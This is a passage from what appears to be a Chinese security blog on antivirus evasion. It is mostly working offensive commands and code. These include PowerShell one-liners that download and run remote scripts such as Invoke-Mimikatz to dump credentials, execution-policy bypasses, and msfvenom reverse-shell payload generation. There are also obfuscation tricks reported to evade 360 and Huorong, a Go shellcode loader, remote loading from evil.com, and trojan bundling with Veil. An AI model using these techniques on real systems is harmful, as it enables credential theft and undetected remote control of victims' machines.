title="1.powershell版本问题"></a>1.powershell版本问题</h4><p>powershell只能针对win7之后的系统，之前的win操作系统默认没有安装powershell。不同架构的payload（x86或x64）需要不同版本的powershell来加载，否则会出错。</p><p>64位所在目录：<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></p><p>32位所在目录：<code>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code></p><h4 id="2-常见执行方式"><a href="#2-常见执行方式" class="headerlink" title="2.常见执行方式"></a>2.常见执行方式</h4><p><strong>网络环境直接执行代码</strong></p><p>无文件写入，相对较为隐蔽。下面代码为加载远程脚本<code>Invoke-Mimikatz.ps1</code>，执行Mimikatz的DumpCreds功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.211.55.2/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure><p><strong>本地执行</strong></p><p>先把<code>[http://10.211.55.2/Invoke-Mimikatz.ps1](http://10.211.55.2/Invoke-Mimikatz.ps1)</code>下载到本地</p><p>然后导入<code>powershell Import-Module .\Invoke-Mimikatz.ps1</code></p><p>使用命令<code>Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&#39;</code></p><p>或者<code>Invoke-Mimikatz -DumpCreds</code></p><h4 id="3-执行策略"><a href="#3-执行策略" class="headerlink" title="3.执行策略"></a>3.执行策略</h4><p>查看执行策略<code>powershell Get-ExecutionPolicy</code></p><p>powershell有六种执行策略：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Unrestricted ：权限最高，可以不受限制执行任意脚本</span><br><span class="line">Restricted ：默认策略，不允许任意脚本的执行</span><br><span class="line">AllSigned ：所有脚本必须经过签名运行</span><br><span class="line">RemoteSigned ：本地脚本无限制，但是对来自网络的脚本必须经过签名</span><br><span class="line">Bypass ：没有任何限制和提示</span><br><span class="line">Undefined ：没有设置脚本的策略</span><br></pre></td></tr></table></figure><p>默认情况下，禁止脚本执行。除非管理员更改执行策略。</p><p><code>powershell Set-ExecutionPolicy Unrestricted</code>设置执行策略（需要管理员权限）</p><p>绕过执行策略执行大概有以下几种：</p><p><strong>本地读取然后通过管道符运行</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Get-Content 1.ps1 | powershell -NoProfile -</span><br></pre></td></tr></table></figure><p><strong>远程下载并通过IEX运行脚本</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://47.94.80.129/ps/a.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><strong>Bypass执行策略绕过</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy bypass -File ./a.ps1</span><br></pre></td></tr></table></figure><p>不会显示警告和提示</p><p><strong>Unrestricted执行策略标志</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy unrestricted -File ./a.ps1</span><br></pre></td></tr></table></figure><p>当运行一个从网上下载的未签名的脚本时，会给出权限提示</p><p>需要解释的是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。</span><br><span class="line">WindowStyle Hidden（-w Hidden）：隐藏窗口</span><br><span class="line">Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。</span><br><span class="line">NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。</span><br><span class="line">Noexit（-Noe）：执行后不退出Shell。</span><br><span class="line">EncodedCommand（-enc）: 接受base64 encode的字符串编码，避免一些解析问题</span><br></pre></td></tr></table></figure><h3 id="2-powershell加载shellcode方法"><a href="#2-powershell加载shellcode方法" class="headerlink" title="2.powershell加载shellcode方法"></a>2.powershell加载shellcode方法</h3><h4 id="1-msf-ps1本地执行-VT-20-59-过360"><a href="#1-msf-ps1本地执行-VT-20-59-过360" class="headerlink" title="1.msf-ps1本地执行(VT:20&#x2F;59 过360)"></a>1.msf-ps1本地执行(VT:20&#x2F;59 过360)</h4><p>用msfvenom生成powershell马，注意这里是<code>-f psh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/x64/meterpreter/reverse_https -e x86/shikata_ga_nai -i 15 -b &#x27;\x00&#x27; lhost=192.168.43.30 lport=3333 -f psh -o shell.ps1</span><br></pre></td></tr></table></figure><p>将shell.ps1拷贝到测试机器上，本地执行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -NoExit -File  shell.ps1</span><br></pre></td></tr></table></figure><h4 id="2-Invoke-Shellcode加载（VT-shell-ps1-0-59）"><a href="#2-Invoke-Shellcode加载（VT-shell-ps1-0-59）" class="headerlink" title="2.Invoke-Shellcode加载（VT:shell.ps1-0&#x2F;59）"></a>2.Invoke-Shellcode加载（VT:shell.ps1-0&#x2F;59）</h4><p>先用msfvenom生成脚本木马</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.43.30 LPORT=3333 -f powershell -o shell.ps1</span><br></pre></td></tr></table></figure><p>在目标机器上执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)</span><br><span class="line"><span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.43.30/shell.ps1&quot;</span>)</span><br><span class="line"><span class="built_in">Invoke-Shellcode</span> <span class="literal">-Shellcode</span> (<span class="variable">$buf</span>) <span class="literal">-Force</span>  运行木马</span><br></pre></td></tr></table></figure><h4 id="3-Invoke-Obfuscation对ps1免杀-VT-4-58"><a href="#3-Invoke-Obfuscation对ps1免杀-VT-4-58" class="headerlink" title="3.Invoke-Obfuscation对ps1免杀(VT:4&#x2F;58)"></a>3.Invoke-Obfuscation对ps1免杀(VT:4&#x2F;58)</h4><p>powershell的免杀方法有很多，对代码进行编码是最常见的一种，这里介绍一个专门用来对powershell进行编码免杀的框架Invoke-Obfuscation，这也是著名的APT32组织海莲花常用的一个工具。</p><p>Invoke-Obfuscation主要是对ps1脚本进行免杀，所以这里还是需要现有一个ps的payload，我还是用法1的msf生成的payload。</p><p>下载<code>Invoke-Obfuscation</code>：<code>git clone https://github.com/danielbohannon/Invoke-Obfuscation</code></p><p>进入Invoke-Obfuscation目录，在powershell中执行<code>Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation</code></p><p>然后执行<code>set scriptpath c:\test\shell.ps1</code> 指定待处理的Ps1文件，或者<code>set scriptblock &#39;echo xss&#39;</code>指定待处理的ps代码</p><p>然后输入<code>encoding</code>，再选择编码方式，比如1</p><p>然后执行<code>out c:\test\jiami.ps1</code>即可输出处理好的ps1文件.</p><p>本地执行可上线<code>powershell.exe -ExecutionPolicy Bypass -NoExit -File c:\test\jiami.ps1</code></p><h4 id="4-ps1行为免杀"><a href="#4-ps1行为免杀" class="headerlink" title="4.ps1行为免杀"></a>4.ps1行为免杀</h4><p>虽然ps1代码自身免杀，但在用powershell执行远程下载或执行shellcode时，很容易触发杀软行为规则。</p><p>对于IEX这种方便快捷的方式直接运行会被360拦截。可尝试从语法上简单变化。主要是对DownloadString、http做一些处理。</p><p>比如利用replace替换函数，可以bypass。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoExit &quot;$c1=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;$c2=&#x27;123(&#x27;&#x27;http://192.168.43.30/shell.ps1&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX ($c1+$c2)&quot;</span><br></pre></td></tr></table></figure><p>可过360和火绒</p><h2 id="5-go"><a href="#5-go" class="headerlink" title="5.go"></a>5.go</h2><p>目标机器不一定有go环境，且go编译出来的exe大约2.3M左右，使用upx压缩下大约1.5M,不过相比python编译的exe应该还能接受了，免杀效果还比python-exe要好一些。</p><h3 id="1-Go嵌入shellcode"><a href="#1-Go嵌入shellcode" class="headerlink" title="1.Go嵌入shellcode"></a>1.Go嵌入shellcode</h3><p>先用msfvenom生成C语言的shellcode，注意要生成x64的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.43.30 lport=3333 -f c</span><br></pre></td></tr></table></figure><p>将shellcode转换成16进制的形式例如：\xfc-&gt;0xfc</p><p>将转换后的shellcode替换到下面的<code>shellcode_buf</code>位置，文件保存为<code>shell.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    <span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">    MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">    PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    kernel32       = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">    ntdll          = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">    VirtualAlloc   = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">    RtlCopyMemory  = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">    shellcode_buf = []<span class="type">byte</span>&#123; </span><br><span class="line">        <span class="number">0xfc</span>, <span class="number">0x48</span>,  ----shellcode----, <span class="number">0xd5</span>,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkErr</span><span class="params">(err <span class="type">error</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">            <span class="built_in">println</span>(err.Error())</span><br><span class="line">            os.Exit(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    shellcode := shellcode_buf</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(os.Args) &gt; <span class="number">1</span> &#123;</span><br><span class="line">        shellcodeFileData, err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line">        checkErr(err)</span><br><span class="line">        shellcode = shellcodeFileData</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">    <span class="keyword">if</span> addr == <span class="number">0</span> &#123;</span><br><span class="line">        checkErr(err)</span><br><span class="line">    &#125;</span><br><span class="line">    _, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    checkErr(err)</span><br><span class="line">    syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安装golang，参考：<code>[https://www.runoob.com/go/go-environment.html](https://www.runoob.com/go/go-environment.html)</code></p><p>在命令行执行命令<code>go build</code>，编译生成<code>test.exe</code>，在测试机执行。不过大约两分钟后，360安全大脑提示云查杀报警了。</p><p>在网上还找到另外一个代码，不过执行和编译老出错，有兴趣的可以试一下，代码如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;unsafe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    buf := <span class="string">&quot;&quot;</span></span><br><span class="line">    buf += <span class="string">&quot;xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c&quot;</span></span><br><span class="line">    ...省略...</span><br><span class="line">    buf += <span class="string">&quot;xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2&quot;</span></span><br><span class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></span><br><span class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></span><br><span class="line">    shellcode := []<span class="type">byte</span>(buf)</span><br><span class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-Go加载器"><a href="#2-Go加载器" class="headerlink" title="2.Go加载器"></a>2.Go加载器</h3><h4 id="1-go-shellcode加载器-VT查杀率4-69"><a href="#1-go-shellcode加载器-VT查杀率4-69" class="headerlink" title="1.go-shellcode加载器(VT查杀率4&#x2F;69)"></a>1.go-shellcode加载器(VT查杀率4&#x2F;69)</h4><p>需要先下载加载器：<code>https://github.com/brimstone/go-shellcode</code></p><p>下载后，进入<code>go-shellcode\cmd\sc</code>目录，执行<code>go build</code>(cmd下即可)生成<code>sc.exe</code></p><p>然后用Msfvenom生成hex格式的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f hex -o shell.hex LHOST=192.168.43.30 LPORT=3333</span><br></pre></td></tr></table></figure><p>使用sc加载器进行加载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe shellcode</span><br></pre></td></tr></table></figure><h4 id="2-gsl加载器"><a href="#2-gsl加载器" class="headerlink" title="2.gsl加载器"></a>2.gsl加载器</h4><p>gsl是<code>Jayl1n</code>根据go-shellcode进行了修改完善的工具。</p><p>下载gsl加载器：<code>wget https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/gsl-sc-loader.zip</code></p><p>包含两个版本，x86和x64。提供了三种加载方式</p><p>1、从参数传入 （必须是HEX格式）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -s SHELLCODE -hex</span><br></pre></td></tr></table></figure><p>2、从文件传入</p><p>加载 RAW 格式：<code>gsl -f shell.raw</code></p><p>加载 HEX 格式：<code>gsl -f shell.hex -hex</code></p><p>3、从远程服务器加载</p><p>把 SHELLCODE 文件挂在WEB目录下。（支持HTTP&#x2F;HTTPS）</p><p>加载 RAW 格式：<code>gsl -u [http://evil.com/shell.raw](http://evil.com/shell.raw)</code></p><p>加载 HEX 格式：<code>gsl -u [http://evil.com/shell.hex](http://evil.com/shell.hex) -hex</code></p><p>以x64为例进行测试，先生成x64的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=10.211.55.2 LPORT=3333 -f hex -o shell.hex</span><br></pre></td></tr></table></figure><p>试一下远程加载<code>gsl64.exe -u http://192.168.43.30/shell.hex -hex</code>即可上线</p><p>更多免杀参考：<a href="https://github.com/TideSec/BypassAntiVirus/">https://github.com/TideSec/BypassAntiVirus/</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++之11种方法免杀 </tag>
            
            <tag> python之7种免杀方法 </tag>
            
            <tag> c#之5种免杀方法 </tag>
            
            <tag> powershell之4种免杀方法 </tag>
            
            <tag> go之3种免杀方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀一-工具免杀</title>
      <link href="/2020/10/03/%E5%85%8D%E6%9D%80%E4%B8%80-%E5%B7%A5%E5%85%B7%E5%85%8D%E6%9D%80/"/>
      <url>/2020/10/03/%E5%85%8D%E6%9D%80%E4%B8%80-%E5%B7%A5%E5%85%B7%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<p>本文简单的介绍一下杀软检测思路以及一些工具的使用。</p><span id="more"></span><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-常见杀软检测技术"><a href="#1-常见杀软检测技术" class="headerlink" title="1.常见杀软检测技术"></a>1.常见杀软检测技术</h3><h4 id="1-静态扫描技术"><a href="#1-静态扫描技术" class="headerlink" title="1.静态扫描技术"></a>1.静态扫描技术</h4><p>1.扫描压缩包（带密码的扫描不了）</p><p>2.急救盘扫描（杀软自带功能，u盘，攻击之后）</p><p>3.智能扫描（扫描磁盘是否有恶意文件）</p><p>4.全盘扫描</p><p>5.开机扫描</p><p>…</p><h4 id="2-动态监控技术"><a href="#2-动态监控技术" class="headerlink" title="2.动态监控技术"></a>2.动态监控技术</h4><p>1.内存监控</p><p>2.网页监控</p><p>3.行为监控（针对msf、cs）</p><p>…</p><h3 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2.检测方法"></a>2.检测方法</h3><p>1.特征码扫描</p><p>2.进程行为检测（沙盒法： <a href="https://app.any.run/%EF%BC%89">https://app.any.run/）</a></p><p>3.主动防御（杀软）</p><p>4.机器学习识别</p><p>…</p><h3 id="3-杀软绕过思路"><a href="#3-杀软绕过思路" class="headerlink" title="3.杀软绕过思路"></a>3.杀软绕过思路</h3><p>1.修改特征码</p><p>2.加壳（杀软已经把常见的壳加入到恶意规则里面了）</p><p>3.二次编译（写一个东西可以分离加载shellcode再进行编译）</p><p>4.分离免杀（通过下载加载shellcode）</p><p>…</p><h2 id="2-举例"><a href="#2-举例" class="headerlink" title="2.举例"></a>2.举例</h2><h4 id="1-msf"><a href="#1-msf" class="headerlink" title="1.msf"></a>1.msf</h4><h5 id="1-msf编码（老掉牙了，VT检测90-以上）"><a href="#1-msf编码（老掉牙了，VT检测90-以上）" class="headerlink" title="1.msf编码（老掉牙了，VT检测90%以上）"></a>1.msf编码（老掉牙了，VT检测90%以上）</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; msfvenom -l encoders   #查看编码方式</span><br><span class="line">[*] exec: msfvenom -l encoders</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Framework Encoders [--encoder &lt;value&gt;]</span><br><span class="line">======================================</span><br><span class="line"></span><br><span class="line">    Name                          Rank       Description</span><br><span class="line">    ----                          ----       -----------</span><br><span class="line"> </span><br><span class="line"> ...省略...</span><br><span class="line">    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">    ...省略...</span><br><span class="line"></span><br><span class="line">msf5 &gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.14 lport=1234 -e x86/shikata_ga_nai -i 10 -f exe &gt; 1.exe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-i：编码次数 -e：选择excellent的编码方式</span></span><br><span class="line">[*] exec: msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.14 lport=1234 -e x86/shikata_ga_nai -i 10 -f exe &gt; 1.exe</span><br><span class="line">...省略...</span><br></pre></td></tr></table></figure><h5 id="2-msf捆绑（被捆绑的软件不能正常使用）"><a href="#2-msf捆绑（被捆绑的软件不能正常使用）" class="headerlink" title="2.msf捆绑（被捆绑的软件不能正常使用）"></a>2.msf捆绑（被捆绑的软件不能正常使用）</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.14 lport=1234 -x /root/example.exe -e x86/shikata_ga_nai -i 10 -f exe &gt; 1.exe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> -x:被捆绑的软件的目录  一般是与其他编码方式结合起来，降低被杀概率</span></span><br></pre></td></tr></table></figure><h5 id="3-msf内置免杀模块（老掉牙）"><a href="#3-msf内置免杀模块（老掉牙）" class="headerlink" title="3.msf内置免杀模块（老掉牙）"></a>3.msf内置免杀模块（老掉牙）</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search evasion  #搜索相应的模块</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash"> Name                                                 Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                                 ---------------  ----    -----  -----------</span><br><span class="line">  ...省略...</span><br><span class="line">   5  evasion/windows/windows_defender_exe                                  normal  No     Microsoft Windows Defender Evasive Executable</span><br><span class="line">   ...省略...</span><br><span class="line">   Evaluation</span><br><span class="line">msf5 &gt; use evasion/windows/windows_defender_exe</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-veil（老版kali自带，新版没有）"><a href="#2-veil（老版kali自带，新版没有）" class="headerlink" title="2.veil（老版kali自带，新版没有）"></a>2.veil（老版kali自带，新版没有）</h4><p>github项目地址：<a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a></p><p>结合msf使用示例：</p><p>veil设置：（生成的可执行文件VT检测70%左右）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/evasion/Veil# python3 Veil.py</span><br><span class="line">...省略...</span><br><span class="line">Main Menu</span><br><span class="line">        2 tools loaded</span><br><span class="line">Available Tools:</span><br><span class="line">        1)      Evasion#常用的模块</span><br><span class="line">        2)      Ordnance</span><br><span class="line">Available Commands:#能够使用命令,后续每选择一次命令都会显示相应的可使用命令</span><br><span class="line">        exit                    Completely exit Veil</span><br><span class="line">        info                    Information on a specific tool</span><br><span class="line">        list                    List available tools</span><br><span class="line">        options                 Show Veil configuration</span><br><span class="line">        update                  Update Veil</span><br><span class="line">        use                     Use a specific tool</span><br><span class="line"><span class="meta prompt_">Veil&gt;</span><span class="language-bash">: use 1  <span class="comment">#选择模块</span></span></span><br><span class="line">...省略......省略... </span><br><span class="line">Veil-Evasion Menu                                                                                          </span><br><span class="line">        41 payloads loaded                                                                                   </span><br><span class="line">Available Commands:                                                                                               back                    Go to Veil&#x27;s main menu                                                               checkvt                 Check VirusTotal.com against generated hashes  #检查VT上的免杀率                     clean                   Remove generated artifacts                                                          exit                    Completely exit Veil                                                                 info                    Information on a specific payload                                                   list                    List available payloads   #  列出能够使用的模块                                         use                     Use a specific payload                                                       Veil/Evasion&gt;: list                                                                                          ...省略...</span><br><span class="line"> [*] Available Payloads:                                                                                           ...省略...                                                                      Veil/Evasion&gt;: use 22 #选择适合的payload</span><br><span class="line">...省略...</span><br><span class="line"></span><br><span class="line"> Payload Information:</span><br><span class="line"> ...省略...</span><br><span class="line">Required Options:                </span><br><span class="line">...省略...</span><br><span class="line"> Available Commands:                </span><br><span class="line">        back            Go back to Veil-Evasion</span><br><span class="line">        exit            Completely exit Veil</span><br><span class="line">        generate        Generate the payload#生成payload</span><br><span class="line">        options         Show the shellcode&#x27;s options</span><br><span class="line">        set             Set shellcode option</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">[powershell/meterpreter/rev_tcp&gt;</span><span class="language-bash">&gt;]: <span class="built_in">set</span> LHOST 192.168.3.17<span class="comment">#依据Required Options:进行相应的设置</span></span></span><br><span class="line"><span class="meta prompt_">[powershell/meterpreter/rev_tcp&gt;</span><span class="language-bash">&gt;]: generate</span></span><br><span class="line">...省略...</span><br><span class="line"><span class="meta prompt_"> [&gt;</span><span class="language-bash">] Please enter the base name <span class="keyword">for</span> output files (default is payload): shell <span class="comment">#对payload进行命名，默认payload</span></span></span><br><span class="line">...省略...</span><br><span class="line"> [*] Language: powershell</span><br><span class="line"> [*] Payload Module: powershell/meterpreter/rev_tcp</span><br><span class="line"> [*] PowerShell doesn&#x27;t compile, so you just get text :)</span><br><span class="line"> [*] Source code written to: /var/lib/veil/output/source/shell.bat #生可利用文件形式之一，后续均为各种可利用文件形式 </span><br><span class="line"> [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/shell.rc </span><br><span class="line"></span><br><span class="line">Hit enter to continue...</span><br><span 